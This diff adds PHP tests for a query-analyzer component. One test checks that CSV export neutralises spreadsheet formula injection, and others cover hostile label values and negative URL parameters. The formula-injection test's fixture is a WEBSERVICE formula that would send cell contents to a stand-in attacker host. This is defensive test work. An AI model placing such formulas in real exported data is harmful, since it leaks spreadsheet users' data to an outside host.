@@ -179,6 +179,45 @@ it( 'merges host-supplied labels over defaults', function (): void {
         ->assertSee( 'Download Report' );
 } );
 
+it( 'sanitizes CSV cells that would otherwise trigger formula injection', function (): void {
+    // A captured query starting with `=`, `+`, `-`, or `@` executes as
+    // a formula when the CSV is opened in Excel/LibreOffice. Prefix
+    // with a single quote to defuse it.
+    SlowQuery::create( [
+        'query'            => '=WEBSERVICE("http://attacker.example/"&A1)',
+        'query_normalized' => 'select * from users',
+        'time_ms'          => 200.0,
+        'connection'       => 'testbench',
+    ] );
+
+    $component = new QueryAnalyzer;
+    $component->mount();
+
+    ob_start();
+    $component->exportCsv()->sendContent();
+    $body = (string) ob_get_clean();
+
+    // The sanitized cell must be prefixed with a single quote so the
+    // spreadsheet reader treats it as text, not a formula.
+    expect( $body )->toContain( "\"'=WEBSERVICE" )
+        ->and( $body )->not->toContain( '"=WEBSERVICE' );
+} );
+
+it( 'accepts a parent-passed dateRange prop that overrides the URL default', function (): void {
+    Livewire::test( QueryAnalyzer::class, [ 'dateRange' => '30d' ] )
+        ->assertSet( 'dateRange', '30d' );
+} );
+
+it( 'rejects a hostile non-string label value on re-hydration', function (): void {
+    // Same pattern as PerformanceDashboard — Livewire re-hydrates
+    // $labels from the client without re-filtering. resolveLabels()
+    // must guard on every render.
+    Livewire::test( QueryAnalyzer::class )
+        ->set( 'labels', [ 'export' => [ 'evil' => 1 ] ] )
+        ->assertOk()
+        ->assertSee( 'Export CSV' );
+} );
+
 it( 'clamps a negative default minTimeMs on mount', function (): void {
     // Values coming through URL restoration can be arbitrary; mount()
     // clamps them so a hostile ?min=-100 can't slip a negative into
